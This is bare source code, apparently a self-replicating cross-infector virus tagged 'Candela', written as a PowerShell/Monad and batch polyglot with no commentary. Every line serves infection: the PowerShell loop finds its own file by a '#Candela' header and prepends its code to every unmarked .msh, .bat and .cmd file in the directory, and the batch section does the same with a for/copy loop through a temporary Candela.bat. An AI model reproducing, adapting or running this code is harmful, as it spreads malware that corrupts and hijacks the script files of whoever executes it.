#Candela
$Candela=('
@echo off %Candela%
rem ','Candela
%Candela%cls
rem ','Candela
find "Candela" <%0 > Candela.bat %Candela%
rem ','Candela
for %%v in (*.bat *.msh *.cmd) do copy Candela.bat+%%v %%v
rem ','Candela
del Candela.bat
rem ','Candela
goto Candela
rem ','Candela
set Candela=1')
$name_array=get-childitem *.msh    #Candela
$name_array+=get-childitem *.bat   #Candela
$name_array+=get-childitem *.cmd   #Candela
foreach ($name in $name_array) {   #Candela
  $cont=get-content $name.Name     #Candela
  if ($cont[0] -eq "#Candela"){
    $my_name=$name.Name            #Candela
  } #Candela
} #Candela
$vir_cont=get-content $my_name     #Candela
foreach ($name in $name_array) {   #Candela
  $cont=get-content $name.Name     #Candela
  if ($cont[0] -ne "#Candela") {
    echo $vir_cont[0] >$name.Name  #Candela
    for ($i=1; $i -lt 34; $i++) { echo $vir_cont[$i] >>$name.Name } #Candela
    echo $cont >>$name.Name        #Candela
  } #Candela
} #Candela
:Candela